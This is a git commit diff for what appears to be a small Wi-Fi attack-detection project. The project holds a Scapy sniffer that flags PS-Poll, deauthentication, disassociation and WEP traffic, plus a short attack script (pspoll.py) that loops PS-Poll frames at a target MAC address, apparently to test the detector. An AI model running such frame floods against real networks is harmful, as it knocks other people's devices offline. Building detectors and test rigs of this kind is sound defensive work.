ffac7780d6eba0267bf221c7efd85e1e09c0fb4e
EtoKekyes <kirill040402@yandex.ru>
2024-05-16 17:49:14 +0200

    111

--- attack_scripts/pspoll.py
+++ attack_scripts/pspoll.py
@@ -2,7 +2,7 @@ from scapy.all import *
 
 frame = RadioTap()/Dot11FCS(type=1, 
                             subtype=10, 
-                            addr1='50:ff:20:6a:e5:a8', 
+                            addr1='84:c9:b2:a2:f6:26', 
                             addr2='c4:3a:be:71:22:7b')
 sendp(frame, iface='wlan1', inter=0.050, loop=1, monitor=True)
 
--- main.py
+++ main.py
@@ -2,23 +2,26 @@
 
 from dataclasses import dataclass, fields
 from scapy.all import sniff, Packet, Dot11WEP, Dot11FCS, Dot11Deauth, Dot11Disas
+from datetime import datetime
+
+now = datetime.now()
 
 def wep(pkt: Packet):
     if pkt.haslayer(Dot11WEP):
-        print(f"WEP AP detected, packet sent from {pkt.addr1} to device {pkt.addr2}")
+        print("[",now,"]",f"WEP AP detected, packet sent from {pkt.addr1} to device {pkt.addr2}")
 
 def pspoll(pkt: Packet):
     if pkt.haslayer(Dot11FCS):
-        print(f"PS-Poll attack detected, packet sent from {pkt.addr1} to device {pkt.addr2}")
+        print("[",now,"]",f"PS-Poll attack detected, packet sent from {pkt.addr1} to device {pkt.addr2}")
 
 def deauth(pkt: Packet):
     #print(pkt.summary())
     if pkt.haslayer(Dot11Deauth):
-        print(f'DoS Deauthentication attack detected, packet sent from {pkt.addr1} to device {pkt.addr2}')
+        print("[",now,"]",f'DoS Deauthentication attack detected, packet sent from {pkt.addr1} to device {pkt.addr2}')
 
 def disas(pkt: Packet):
     if pkt.type==0 and pkt.subtype==12:
-        print(f'DoS Disassociation attack detected, packet sent from {pkt.addr1} to device {pkt.addr2}')
+        print("[",now,"]",f'DoS Disassociation attack detected, packet sent from {pkt.addr1} to device {pkt.addr2}')
 
 
 @dataclass
@@ -36,7 +39,7 @@ def main():
     conf = Config()
     def start(func):
         print("Starting sniffer")
-        sniff(iface=conf.iface, prn=func, store=False, count=0)
+        sniff(iface=conf.iface, prn=func, store=False, count=0, monitor = True)
     while True:
         print(f"\nUsing {conf}")
         match input("Select monitor mode: (pspoll, deauth, disas, wep, config, exit): "):
